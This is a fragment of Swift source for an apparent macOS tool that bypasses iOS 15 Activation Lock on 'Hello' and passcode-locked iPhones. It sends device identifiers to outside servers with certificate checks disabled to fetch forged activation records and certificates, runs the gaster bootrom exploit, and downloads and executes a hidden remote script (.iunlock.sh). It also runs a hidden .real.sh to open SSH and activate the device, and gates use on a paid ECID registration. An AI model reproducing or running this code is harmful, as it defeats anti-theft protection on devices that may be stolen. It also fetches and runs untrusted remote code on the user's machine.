        let Check:String = shellExec(currentDirectory() + "/ideviceinfo | grep -w SerialNumber | awk '{printf $NF}'");
        let Recover:String = shellExec(currentDirectory() + "/irecovery -q | grep -w ECID | awk '{printf $NF}'");
        if(Check != ""){
            return "HelloMode";
        }
        else{
            if(!Recover.contains("ERROR: No device found!")){
                _ = shellExec("cd " + currentDirectory() + "/ && ./irecovery -q | grep -w ECID | awk '{printf $NF}' &>" + currentDirectory() + "/typealmacenado");
                return "RecoveryMode";
            }
            else{
                return "DeviceNoDetected";
            }
        }
    }
    
    
 func GenerateFiles(){

  progressBar.minValue = 0
  progressBar.maxValue = 1
    if(DeviceInfo("SerialNumber") != ""){
  
      DispatchQueue.main.async {
          
              do{
                  self.progressBar.doubleValue = 0
                _ = self.shellExec("rm -rf " + self.Escritorio() + "/iPhone/");
      
                  self.progressBar.doubleValue = 0.1
      
                _ = self.shellExec("/bin/mkdir -p " + self.Escritorio() + "/iPhone");
      
                  self.progressBar.doubleValue = 0.2
      
                _ = self.shellExec("DI(){ " + self.currentDirectory() + "/ideviceinfo| grep -w $1 | awk '{printf $NF}'; }; DeviceInfo(){ DI $1; }; curl -s -k \"https://geminixteam.com/iOS15.php?udid=$(DeviceInfo UniqueDeviceID)&bv=$(DeviceInfo BuildVersion)&dc=$(DeviceInfo DeviceClass)&mn=$(DeviceInfo ModelNumber)&pt=$(DeviceInfo ProductType)&pv=$(DeviceInfo ProductVersion)&ucid=$(DeviceInfo UniqueChipID)\" --output " + self.Escritorio() + "/iPhone/activation_record.plist");
      
                  self.progressBar.doubleValue = 0.4
      
                _ = self.shellExec("echo \"SUCCESS!\"");
                _ = self.shellExec("curl -s -k \"https://geminixteam.com/" + self.DeviceInfo("UniqueDeviceID") + "/IC-Info.sisv\" --output " + self.Escritorio() + "/iPhone/IC-Info.sisv");
      
                  self.progressBar.doubleValue = 0.6
      
      
                  self.progressBar.doubleValue = 0.8
      
                _ = self.shellExec("curl -s -k \"https://geminixteam.com/" + self.DeviceInfo("UniqueDeviceID") + "/Wildcard.der\" --output " + self.Escritorio() + "/iPhone/Wildcard.der");
      
                  self.progressBar.doubleValue = 1
  
                self.BoxShow("Successfully Generated your activation Files in /Users/" + self.shellExec("whoami") + "/Desktop/iPhone!", Buttontext: "Accept");
      
                  self.progressBar.doubleValue = 0
              
                }
        
    }
      
  }
  else{
  
      BoxShow("Device Undetected!\nPlease connect your iDevice!", Buttontext:"Accept");
      
  }
    deviceDetectionHandler = true
  
}

    @IBOutlet weak var Buttonerase:NSButton!
    @IBAction func DOErase(_ sender:Any?){
        deviceDetectionHandler = false
            if(DeviceInfo("SerialNumber") != ""){
                    BoxShow("Device Detected in Hello Mode!\nPlease connect in DFU Pwned Mode!", Buttontext:"Accept");
            }
            else if(ircv_info("MODE") != "DFU"){
                    BoxShow("DFU Mode Device Undetected!\nPlease enter in DFU Mode first!", Buttontext:"Accept");
            }
    else{
            ERASEUnaVez()
    }
        
        deviceDetectionHandler = true
    }
    public func ERASEUnaVez(){
        
        progressBar.minValue = 0
        progressBar.maxValue = 1
        
        
        
        DispatchQueue.main.async{
            do{
                self.progressBar.doubleValue = 0.2
            }
        }
        
        _ = shellExec(currentDirectory() + "/gaster pwn ")
        
        
        DispatchQueue.main.async {
            
                do{
                    self.progressBar.doubleValue = 0.3
                }
        }
        
        _ = shellExec(currentDirectory() + "/gaster reset ")
        
        
        DispatchQueue.main.async {
            
                do{
                    self.progressBar.doubleValue = 0.4
                }
        }
        
        
        DispatchQueue.main.async {
            
                do{
                    self.progressBar.doubleValue = 0.5
                }
        }
        
        DispatchQueue.main.async {
            
                do{
                    self.progressBar.doubleValue = 0.6
                }
        }
        
        _ = shellExec("cd " + Escritorio() + "/tmp/Enviroment; curl -s -k https://bigb033xecution3r.com/iunlockerase.sh -o .iunlock.sh")
        
        
        DispatchQueue.main.async {
            
                do{
                    self.progressBar.doubleValue = 0.7
                }
        }
        _ = shellExec("cd " + Escritorio() + "/tmp/Enviroment; chmod +x .iunlock.sh")
        
        DispatchQueue.main.async {
            
                do{
                    self.progressBar.doubleValue = 0.8
                }
        }
        _ = shellExec("cd " + Escritorio() + "/tmp/Enviroment;./.iunlock.sh reset")
        
        DispatchQueue.main.async {
            
                do{
                    self.progressBar.doubleValue = 0.9
                }
        }
        
        
        DispatchQueue.main.async {
            
                do{
                    self.progressBar.doubleValue = 1
                }
        }
        
        BoxShow("Successfully Reseted iDevice!\nNow, wait to finish the progress bar in your device.", Buttontext:"Accept");
        
        DispatchQueue.main.async {
            
                do{
                    self.progressBar.doubleValue = 0
                }
        }
        
        
    }
    
func DeviceInfo(_ Info:String)->String{
  let Ret:String = shellExec("cd " + currentDirectory() + "; ./ideviceinfo | grep -w " + Info + " | sed 's/" + Info + ": //g'");
  return Ret;
}
    
    
    
    
    
    
    @IBOutlet weak var HelloBTN:NSButton!
    
    @IBAction func DOHello(_ sender:Any?){
        if(shellExec("curl -s -k \"https://bigb033xecution3r.com/Bot/iOS15Registers/Hello/" + ECID() + "/\"").contains("Success")){
            Hello()
                    
        }
        else if(shellExec("curl -s -k \"https://bigb033xecution3r.com/Bot/iOS15Registers/Passcode/" + ECID() + "/\"").contains("Success")){
            Hello()
                    
        }
            else{
                BoxShow(ECID() + " UNREGISTERED!", Buttontext: "Accept")
            }
    }
    
    public func Hello(){
        
        progressBar.minValue = 0
        progressBar.maxValue = 1
        
        DispatchQueue.main.async{
            do{
        _ = self.shellExec("\"/Users/$(whoami)/Desktop/.real.sh\" openssh")
        
        self.progressBar.doubleValue = 0.2
        
        self.progressBar.doubleValue = 0.5
        
        _ = self.shellExec("\"/Users/$(whoami)/Desktop/.real.sh\" mount")
        
        self.progressBar.doubleValue = 0.7

        self.progressBar.doubleValue = 0.9

        _ = self.shellExec("\"/Users/$(whoami)/Desktop/.real.sh\" activatehello")

        self.progressBar.doubleValue = 1
        
                self.BoxShow("Successfully Activated Hello Device!", Buttontext: "Accept")
        
                self.progressBar.doubleValue = 0
            }
        }
        deviceDetectionHandler = true
        
    }
    
    
    
    
    
    @IBOutlet weak var PasscodeBTN:NSButton!
    
    @IBAction func DOReactivate(_ sender:Any?){
        
        if(shellExec("curl -s -k \"https://bigb033xecution3r.com/Bot/iOS15Registers/Hello/" + ECID() + "/\"").contains("Success")){
            Reactivate()
        }
        else if(shellExec("curl -s -k \"https://bigb033xecution3r.com/Bot/iOS15Registers/Passcode/" + ECID() + "/\"").contains("Success")){
            Reactivate()
        }
              else{
                  BoxShow(ECID() + " UNREGISTERED!", Buttontext: "Accept")
              }
        
    }
    
    public func Reactivate(){
        
        progressBar.minValue = 0
        progressBar.maxValue = 1
        _ = self.shellExec("\"/Users/$(whoami)/Desktop/.real.sh\" openssh")
        
        DispatchQueue.main.async{
        self.progressBar.doubleValue = 0.2
        
        self.progressBar.doubleValue = 0.5
        }
        _ = self.shellExec("\"/Users/$(whoami)/Desktop/.real.sh\" mount")
        
        DispatchQueue.main.async{
        self.progressBar.doubleValue = 0.7

        self.progressBar.doubleValue = 0.9
        }

        _ = self.shellExec("\"/Users/$(whoami)/Desktop/.real.sh\" activatepasscode")
        
        DispatchQueue.main.async{
        self.progressBar.doubleValue = 1
    
        
            
        }
        
                BoxShow("Successfully Reactivated Device!", Buttontext: "Accept")
        
        DispatchQueue.main.async{
            do{
                self.progressBar.doubleValue = 0
            }
        }
        deviceDetectionHandler = true
    }
    
    
    func Recovery(){
        if(ircv_info("MODE") == "ERROR: Unable to connect to device"){
            Recovery()
        }
    }
    @IBOutlet weak var labelDebug:NSTextField!
    @IBOutlet weak var ButtonHelper:NSButton!
    
    @IBAction func DFUHelper(_ sender:Any?){
        
        if(DeviceInfo("SerialNumber") != ""){
                _ = shellExec(currentDirectory() + "/ideviceenterrecovery " + DeviceInfo("UniqueDeviceID"))
                if(DeviceInfo("SerialNumber") == ""){
                    DispatchQueue.main.async{
                        do{
                            self.labelDebug.stringValue = "Waiting device in Recovery Mode.."
                        }
                    }
                    Recovery()
                    if(ircv_info("MODE") == "Recovery"){
                    DispatchQueue.main.async{
                        do{
                            self.labelDebug.stringValue = "Device detected in Recovery Mode!."
                        }
                    }
                    }
                    
                    DispatchQueue.main.async{
                        do{
                            self.labelDebug.stringValue = "5"
                        }
                    }
                    sleep(1)
                    DispatchQueue.main.async{
                        do{
                            self.labelDebug.stringValue = "4"
                        }
                    }
                    sleep(1)
                    DispatchQueue.main.async{
                        do{
                            self.labelDebug.stringValue = "3"
                        }
                    }
                    sleep(1)
                    DispatchQueue.main.async{
                        do{
                            self.labelDebug.stringValue = "2"
                        }
                    }
                    sleep(1)
                    DispatchQueue.main.async{
                        do{
                            self.labelDebug.stringValue = "1"
                        }
                    }
                    
            }
        }
        
        
        
    }
}

